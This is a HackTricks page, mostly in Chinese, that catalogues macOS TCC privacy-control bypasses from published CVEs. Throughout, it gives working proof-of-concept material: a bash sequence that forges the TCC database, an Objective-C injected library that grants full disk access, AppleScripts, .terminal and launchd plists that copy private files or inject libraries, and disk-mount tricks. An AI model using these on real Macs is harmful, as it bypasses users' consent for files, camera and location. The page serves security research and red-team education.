# macOS TCC Bypasses

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}

## 按功能分类

### 写入绕过

这不是一个绕过，这只是TCC的工作方式：**它不防止写入**。如果终端**没有权限读取用户的桌面，它仍然可以写入其中**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** 被添加到新的 **file** 以便给 **creators app** 访问读取它的权限。

### TCC ClickJacking

可以 **在 TCC 提示上放置一个窗口**，使用户 **接受** 而不注意。你可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** 中找到一个 PoC。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

攻击者可以 **创建任何名称的应用**（例如 Finder、Google Chrome...）在 **`Info.plist`** 中，并使其请求访问某些 TCC 保护的位置。用户会认为是合法应用在请求此访问。\
此外，可以 **从 Dock 中移除合法应用并将假应用放上去**，因此当用户点击假应用（可以使用相同的图标）时，它可以调用合法应用，请求 TCC 权限并执行恶意软件，使用户相信合法应用请求了访问。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC 在：

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

默认情况下，通过 **SSH 的访问曾经具有 "完全磁盘访问"**。为了禁用此功能，你需要将其列出但禁用（从列表中移除不会删除这些权限）：

![](<../../../../../.gitbook/assets/image (1077).png>)

在这里你可以找到一些 **恶意软件如何能够绕过此保护** 的示例：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
请注意，现在要启用 SSH 你需要 **完全磁盘访问**
{% endhint %}

### Handle extensions - CVE-2022-26767

属性 **`com.apple.macl`** 被赋予文件以给予 **某个应用读取它的权限。** 当 **拖放** 文件到应用上，或当用户 **双击** 文件以使用 **默认应用** 打开时，此属性被设置。

因此，用户可以 **注册一个恶意应用** 来处理所有扩展并调用 Launch Services 来 **打开** 任何文件（因此恶意文件将被授予读取权限）。

### iCloud

权限 **`com.apple.private.icloud-account-access`** 使得与 **`com.apple.iCloudHelper`** XPC 服务进行通信成为可能，该服务将 **提供 iCloud 令牌**。

**iMovie** 和 **Garageband** 拥有此权限以及其他允许的权限。

有关从该权限 **获取 iCloud 令牌** 的漏洞的更多 **信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

具有 **`kTCCServiceAppleEvents`** 权限的应用将能够 **控制其他应用**。这意味着它可能会 **滥用授予其他应用的权限**。

有关 Apple 脚本的更多信息，请查看：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

例如，如果一个应用对 `iTerm` 具有 **自动化权限**，例如在这个例子中 **`Terminal`** 对 iTerm 具有访问权限：

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal，没有 FDA，可以调用 iTerm，iTerm 拥有它，并用它来执行操作：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### 通过 Finder

或者如果一个应用程序可以访问 Finder，它可以使用这样的脚本：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## By App behaviour

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户空间的 **tccd 守护进程** 使用 **`HOME`** **环境** 变量来访问 TCC 用户数据库，路径为：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据 [这篇 Stack Exchange 文章](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，由于 TCC 守护进程通过 `launchd` 在当前用户的域中运行，因此可以 **控制传递给它的所有环境变量**。\
因此，**攻击者可以在 `launchctl` 中设置 `$HOME` 环境** 变量指向一个 **受控** **目录**，**重启** **TCC** 守护进程，然后 **直接修改 TCC 数据库** 以使其 **获得所有可用的 TCC 权限**，而无需提示最终用户。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - 备注

Notes 可以访问 TCC 保护的位置，但当创建一个笔记时，这个笔记是 **在一个非保护的位置创建的**。因此，你可以要求 Notes 将一个受保护的文件复制到一个笔记中（即在一个非保护的位置），然后访问该文件：

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - 迁移

二进制文件 `/usr/libexec/lsd` 与库 `libsecurity_translocate` 具有特权 `com.apple.private.nullfs_allow`，这允许它创建 **nullfs** 挂载，并且具有特权 `com.apple.private.tcc.allow`，以 **`kTCCServiceSystemPolicyAllFiles`** 访问每个文件。

可以将隔离属性添加到“Library”，调用 **`com.apple.security.translocation`** XPC 服务，然后它会将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，其中 Library 内的所有文档都可以 **访问**。

### CVE-2023-38571 - 音乐与电视 <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** 有一个有趣的功能：当它运行时，它会 **导入** 被拖放到 **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** 的文件到用户的“媒体库”。此外，它调用类似于：**`rename(a, b);`** 的操作，其中 `a` 和 `b` 是：

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

这个 **`rename(a, b);`** 行为容易受到 **竞争条件** 的影响，因为可以在 `Automatically Add to Music.localized` 文件夹中放置一个假的 **TCC.db** 文件，然后在创建新文件夹（b）时复制该文件，删除它，并指向 **`~/Library/Application Support/com.apple.TCC`**。

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

如果 **`SQLITE_SQLLOG_DIR="path/folder"`**，基本上意味着 **任何打开的数据库都会被复制到该路径**。在这个 CVE 中，这个控制被滥用以 **写入** 一个 **SQLite 数据库**，该数据库将被 **一个具有 FDA 的进程打开 TCC 数据库**，然后滥用 **`SQLITE_SQLLOG_DIR`**，在文件名中使用 **符号链接**，因此当该数据库被 **打开** 时，用户的 **TCC.db 被覆盖** 为打开的那个。\
**更多信息** [**在写作中**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **和**[ **在演讲中**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s)。

### **SQLITE\_AUTO\_TRACE**

如果环境变量 **`SQLITE_AUTO_TRACE`** 被设置，库 **`libsqlite3.dylib`** 将开始 **记录** 所有的 SQL 查询。许多应用程序使用这个库，因此可以记录它们所有的 SQLite 查询。

多个 Apple 应用程序使用这个库来访问 TCC 保护的信息。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

这个 **env 变量被 `Metal` 框架使用**，这是多个程序的依赖，最显著的是 `Music`，它具有 FDA。

设置以下内容：`MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。如果 `path` 是有效目录，漏洞将被触发，我们可以使用 `fs_usage` 查看程序中发生的事情：

* 一个文件将被 `open()`，名为 `path/.dat.nosyncXXXX.XXXXXX`（X 是随机的）
* 一个或多个 `write()` 将内容写入该文件（我们无法控制这一点）
* `path/.dat.nosyncXXXX.XXXXXX` 将被 `renamed()` 为 `path/name`

这是一个临时文件写入，随后是一个 **`rename(old, new)`** **这不是安全的。**

这不安全，因为它必须 **分别解析旧路径和新路径**，这可能需要一些时间，并且可能容易受到竞争条件的影响。有关更多信息，您可以查看 `xnu` 函数 `renameat_internal()`。

{% hint style="danger" %}
所以，基本上，如果一个特权进程正在从您控制的文件夹重命名，您可能会获得 RCE 并使其访问不同的文件，或者像在这个 CVE 中那样，打开特权应用程序创建的文件并存储一个 FD。

如果重命名访问一个您控制的文件夹，同时您已修改源文件或拥有其 FD，您可以将目标文件（或文件夹）更改为指向一个符号链接，这样您可以随时写入。
{% endhint %}

这是 CVE 中的攻击：例如，要覆盖用户的 `TCC.db`，我们可以：

* 创建 `/Users/hacker/ourlink` 指向 `/Users/hacker/Library/Application Support/com.apple.TCC/`
* 创建目录 `/Users/hacker/tmp/`
* 设置 `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* 通过运行带有此 env 变量的 `Music` 来触发漏洞
* 捕获 `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` 的 `open()`（X 是随机的）
* 在这里我们也 `open()` 这个文件以进行写入，并保持文件描述符
* 原子性地在 `/Users/hacker/tmp` 和 `/Users/hacker/ourlink` 之间切换 **在一个循环中**
* 我们这样做是为了最大化成功的机会，因为竞争窗口非常小，但输掉比赛的代价微乎其微
* 等待一会儿
* 测试我们是否幸运
* 如果没有，从头再来

更多信息请查看 [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
现在，如果您尝试使用 env 变量 `MTL_DUMP_PIPELINES_TO_JSON_FILE`，应用程序将无法启动
{% endhint %}

### Apple Remote Desktop

作为 root，您可以启用此服务，**ARD 代理将具有完全的磁盘访问权限**，这可能会被用户滥用以使其复制新的 **TCC 用户数据库**。

## 通过 **NFSHomeDirectory**

TCC 在用户的 HOME 文件夹中使用数据库来控制对特定于用户的资源的访问，路径为 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果用户设法使用指向 **不同文件夹** 的 $HOME env 变量重新启动 TCC，用户可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 中创建一个新的 TCC 数据库，并欺骗 TCC 授予任何应用程序任何 TCC 权限。

{% hint style="success" %}
请注意，Apple 使用存储在用户配置文件中的 **`NFSHomeDirectory`** 属性的设置作为 **`$HOME`** 的值，因此如果您妥协了具有修改此值权限的应用程序（**`kTCCServiceSystemPolicySysAdminFiles`**），您可以通过 TCC 绕过 **武器化** 此选项。
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 来修改用户的 **HOME** 文件夹。

1. 获取目标应用程序的 _csreq_ blob。
2. 植入一个带有所需访问权限和 _csreq_ blob 的假 _TCC.db_ 文件。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 导出用户的目录服务条目。
4. 修改目录服务条目以更改用户的主目录。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 导入修改后的目录服务条目。
6. 停止用户的 _tccd_ 并重启该进程。

第二个 POC 使用 **`/usr/libexec/configd`**，它具有 `com.apple.private.tcc.allow`，值为 `kTCCServiceSystemPolicySysAdminFiles`。\
可以使用 **`-t`** 选项运行 **`configd`**，攻击者可以指定 **自定义 Bundle 进行加载**。因此，该漏洞 **替换** 了 **`dsexport`** 和 **`dsimport`** 更改用户主目录的方法，使用 **`configd` 代码注入**。

有关更多信息，请查看 [**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。

## 通过进程注入

有不同的技术可以在进程内部注入代码并滥用其 TCC 权限：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

此外，发现的最常见的通过 TCC 绕过的进程注入是通过 **插件（加载库）**。\
插件是通常以库或 plist 形式存在的额外代码，将由主应用程序 **加载** 并在其上下文中执行。因此，如果主应用程序具有对 TCC 限制文件的访问（通过授予的权限或特权），**自定义代码也将具有此权限**。

### CVE-2020-27937 - Directory Utility

应用程序 `/System/Library/CoreServices/Applications/Directory Utility.app` 具有特权 **`kTCCServiceSystemPolicySysAdminFiles`**，加载了扩展名为 **`.daplug`** 的插件，并且 **没有经过强化** 的运行时。

为了武器化此 CVE，**`NFSHomeDirectory`** 被 **更改**（滥用之前的特权），以便能够 **接管用户的 TCC 数据库** 以绕过 TCC。

有关更多信息，请查看 [**原始报告**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。

### CVE-2020-29621 - Coreaudiod

二进制文件 **`/usr/sbin/coreaudiod`** 具有特权 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager`。第一个 **允许代码注入**，第二个则赋予其 **管理 TCC** 的权限。

该二进制文件允许从文件夹 `/Library/Audio/Plug-Ins/HAL` 加载 **第三方插件**。因此，可以使用此 PoC **加载插件并滥用 TCC 权限**：
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### 设备抽象层 (DAL) 插件

通过 Core Media I/O 打开摄像头流的系统应用程序（具有 **`kTCCServiceCamera`** 的应用程序）会加载位于 `/Library/CoreMediaIO/Plug-Ins/DAL` 的 **这些插件**（不受 SIP 限制）。

只需在此存储一个带有公共 **构造函数** 的库即可 **注入代码**。

多个 Apple 应用程序对此存在漏洞。

### Firefox

Firefox 应用程序具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` 权限：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
有关如何轻松利用此漏洞的更多信息，请[**查看原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

二进制文件`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`具有权限**`com.apple.private.tcc.allow`**和**`com.apple.security.get-task-allow`**，这允许在进程内部注入代码并使用TCC权限。

### CVE-2023-26818 - Telegram

Telegram具有权限**`com.apple.security.cs.allow-dyld-environment-variables`**和**`com.apple.security.cs.disable-library-validation`**，因此可以利用它**获取其权限**，例如使用相机录制。您可以[**在写作中找到有效载荷**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

注意如何使用环境变量加载库，**创建了一个自定义plist**来注入此库，并使用**`launchctl`**来启动它：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## 通过 open 调用

即使在沙盒中也可以调用 **`open`**

### 终端脚本

在技术人员使用的计算机上，给终端 **完全磁盘访问 (FDA)** 是很常见的。并且可以使用它调用 **`.terminal`** 脚本。

**`.terminal`** 脚本是 plist 文件，例如这个文件，其中包含在 **`CommandString`** 键中要执行的命令：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
一个应用程序可以在 /tmp 等位置写入一个终端脚本，并使用如下命令启动它：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount\_apfs TCC 绕过和权限提升

**任何用户**（甚至是无特权用户）都可以创建并挂载时间机器快照，并**访问该快照的所有文件**。\
所需的**唯一特权**是用于访问的应用程序（如 `Terminal`）必须具有**完全磁盘访问**（FDA）权限（`kTCCServiceSystemPolicyAllfiles`），该权限需要由管理员授予。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

更详细的解释可以在[**原始报告中找到**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - 挂载 TCC 文件

即使 TCC DB 文件受到保护，仍然可以**挂载一个新的 TCC.db 文件到该目录**：

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
检查**完整利用**在[**原始写作**](https://theevilbit.github.io/posts/cve-2021-30808/)中。

### asr

工具**`/usr/sbin/asr`**允许复制整个磁盘并将其挂载到另一个位置，从而绕过TCC保护。

### 位置服务

在**`/var/db/locationd/clients.plist`**中有一个第三个TCC数据库，用于指示允许**访问位置服务**的客户端。\
文件夹**`/var/db/locationd/`没有受到DMG挂载的保护**，因此可以挂载我们自己的plist。

## 通过启动应用程序

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## 通过grep

在几种情况下，文件会在未受保护的位置存储敏感信息，如电子邮件、电话号码、消息等……（这被视为Apple的一个漏洞）。

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## 合成点击

这不再有效，但它[**在过去有效**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

另一种使用[**CoreGraphics事件**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)的方法：

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## 参考

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{% hint style="success" %}
学习和实践AWS黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践GCP黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。

</details>
{% endhint %}
